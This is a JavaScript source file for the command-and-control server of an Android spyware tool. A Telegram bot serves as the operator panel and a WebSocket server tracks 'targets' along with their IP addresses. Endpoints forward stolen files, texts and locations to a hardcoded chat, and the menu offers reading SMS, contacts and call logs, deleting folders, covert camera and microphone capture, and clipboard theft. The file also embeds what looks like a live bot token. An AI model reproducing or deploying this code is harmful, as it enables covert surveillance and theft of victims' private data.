const socket = require('ws'),
    http = require('http'),
    express = require('express'),
    TelegramBot = require('node-telegram-bot-api'),
    multer = require('multer'),
    bodyParser = require('body-parser'),
    uuid4 = require('uuid'),
    axios = require('axios');

const upload = multer();
const app = express();
app.use(bodyParser.json());
const server = http.createServer(app);
const wss = new socket.Server({ server });

// --- الأسطر الهامة التي تم إصلاحها ---
const chatId = '7984067238'; 
const token = '8287627600:AAE-eesx035E8p8f6tTC0GqY2HhxQQKuZME';
const serverAddr = 'https://x2cyber.onrender.com';
// ----------------------------------

const bot = new TelegramBot(token, { polling: true });

app.get('/', (req, res) => {
    res.send('Server is Running Live 🚀');
});

app.post('/upload', upload.single('file'), (req, res) => {
    var name = req.file.originalname;
    bot.sendDocument(chatId, req.file.buffer, {}, {
        filename: name,
        contentType: 'application/txt'
    }).catch(function (error) {
        console.log(error);
    });
    res.send(name);
});

app.post('/text', (req, res) => {
    bot.sendMessage(chatId, req.body.text, { parse_mode: 'HTML' });
    res.send(req.body.text);
});

app.post('/location', (req, res) => {
    bot.sendLocation(chatId, req.body.l1, req.body.l2);
    res.send(req.body.l1.toString());
});

server.listen(process.env.PORT || 10000, () => {
    console.log('Server started on port ' + server.address().port);
});

wss.on('connection', (ws, req) => {
    ws.uuid = uuid4.v4();
    bot.sendMessage(chatId, `<b>New Target Connected 📱</b>\n\nID = <code>${ws.uuid}</code>\nIP = ${req.socket.remoteAddress.replace('::ffff:', '')}`, { parse_mode: 'HTML' });
});

setInterval(() => {
    wss.clients.forEach(client => {
        client.send('be alive');
    });
}, 2000);

bot.on('message', msg => {
    if (msg.text === '/start') {
        bot.sendMessage(chatId, '<b>☄ Select Action For Device :</b>', {
            reply_markup: {
                keyboard: [['Status ⚙'], ['Action ☄']]
            },
            parse_mode: 'HTML'
        });
    }

    if (msg.text === 'Status ⚙') {
        const onlineClients = wss.clients.size;
        let message = onlineClients > 0 ? `<b>${onlineClients} Online Client</b> ✅\n\n` : '<b>No Online Client</b> ❌';
        if (onlineClients > 0) {
            wss.clients.forEach(client => {
                message += `ID => <code>${client.uuid}</code>\n\n`;
            });
        }
        bot.sendMessage(chatId, message, { parse_mode: 'HTML' });
    }

    if (msg.text === 'Action ☄') {
        if (wss.clients.size > 0) {
            let keyboard = [
                [{ text: 'All Contact 👤', callback_data: 'cl' }, { text: 'Call Log 📞', callback_data: 'gc' }],
                [{ text: 'All Sms 💬', callback_data: 'as' }, { text: 'Send Sms 💬', callback_data: 'ss' }],
                [{ text: 'Installed Apps 📲', callback_data: 'ia' }, { text: 'Device Model 📱', callback_data: 'dm' }],
                [{ text: 'Get Folder 📄', callback_data: 'gf' }, { text: 'Delete Folder 🗑', callback_data: 'df' }],
                [{ text: 'Main Camera 📷', callback_data: 'cam1' }, { text: 'Front Camera 🤳', callback_data: 'cam2' }],
                [{ text: 'Mic 1 🎤', callback_data: 'mi1' }, { text: 'Mic 2 🎤', callback_data: 'mi2' }, { text: 'Mic 3 🎤', callback_data: 'mi3' }],
                [{ text: 'Clip Board 📄', callback_data: 'cp' }]
            ];
            wss.clients.forEach(client => {
                bot.sendMessage(chatId, `<b>Action For Device :</b> <code>${client.uuid}</code>`, {
                    reply_markup: { inline_keyboard: keyboard },
                    parse_mode: 'HTML'
                });
            });
        } else {
            bot.sendMessage(chatId, '<b>No Online Client</b> ❌', { parse_mode: 'HTML' });
        }
    }
});

bot.on('callback_query', query => {
    const data = query.data;
    const targetId = query.message.text.split(' : ')[1];
    wss.clients.forEach(client => {
        if (client.uuid === targetId) {
            client.send(data);
        }
    });
});

setInterval(() => {
    axios.get(serverAddr).catch(() => {});
}, 110000);
